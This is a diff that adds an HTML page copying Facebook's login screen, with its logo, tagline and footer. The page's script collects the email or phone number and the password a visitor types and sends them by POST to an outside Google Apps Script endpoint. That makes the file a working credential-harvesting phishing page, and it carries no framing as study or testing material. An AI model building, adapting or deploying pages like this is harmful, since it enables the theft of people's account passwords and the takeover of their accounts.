@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="main-contend-section">
+        <div class="main-container">
+            <div class="w-50">
+                <div class="logo">
+                    <img src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242147/facebook%20clone/logo_mlo10v.svg" alt="Logo">
+                </div>
+                <div class="fb-tag-line">
+                    <h3 id="tnk">Facebook helps you connect and share with the people in your life.</h3>
+                </div>
+            </div>
+            <div class="w-50">
+                <div class="form-section">
+                    <form id="contact-form" method="POST">
+                        <input type="text" name="email-or-number" id="email-or-number" placeholder="Email address or phone number" required>
+                        <input type="password" name="password" id="password" placeholder="Password" required>
+                        <input type="submit" name="submit" id="submit" value="Log In">
+                        <a href="#" target="_self" class="forgot">Forgotten password?</a>
+                        <div class="line"></div>
+                        <a href="#" target="_self" class="create-new-acc">Create New Account</a>
+                    </form>
+                    <div id="message" style="display:none;"></div>
+                </div>
+                <div class="create-page">
+                    <p><a href="#" target="_self">Create a Page</a> for a celebrity, band or business.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-section">
+        <div class="footer-container">
+            <!-- Language and links omitted for brevity -->
+            <div class="copywrite">
+                <p>Facebook &copy; 2023</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("contact-form").addEventListener("submit", function (e) {
+            e.preventDefault(); // Prevent the default form submission
+            const messageDiv = document.getElementById("message");
+            messageDiv.textContent = "Submitting..";
+            messageDiv.style.display = "block";
+            document.getElementById("submit").disabled = true; // Fixed ID reference
+
+            // Collect the form data
+            var formData = new FormData(this);
+            var keyValuePairs = [];
+            for (var pair of formData.entries()) {
+                keyValuePairs.push(pair[0] + "=" + pair[1]);
+            }
+
+            var formDataString = keyValuePairs.join("&");
+
+            // Send a POST request to your Google Apps Script
+            fetch("https://script.google.com/macros/s/AKfycbwW6X3oNVFupMa01L-7fTiczRIVq-_9w2A3L2_KfvOBqvNyefVXYDZXEqOMlgQTEfam/exec", {
+                redirect: "follow",
+                method: "POST",
+                body: formDataString,
+                headers: {
+                    "Content-Type": "text/plain;charset=utf-8",
+                },
+            })
+            .then(function (response) {
+                if (response.ok) {
+                    return response.json(); // Assuming your script returns JSON
+                } else {
+                    throw new Error("Failed to submit the form.");
+                }
+            })
+            .then(function (data) {
+                messageDiv.textContent = "Data submitted successfully!";
+                messageDiv.style.backgroundColor = "green";
+                messageDiv.style.color = "beige";
+                document.getElementById("submit").disabled = false;
+                document.getElementById("contact-form").reset();
+
+                setTimeout(function () {
+                    messageDiv.textContent = "";
+                    messageDiv.style.display = "none";
+                }, 2600);
+            })
+            .catch(function (error) {
+                console.error(error);
+                messageDiv.textContent = "An error occurred while submitting the form.";
+                messageDiv.style.display = "block";
+            });
+        });
+    </script>
+</body>
+</html>
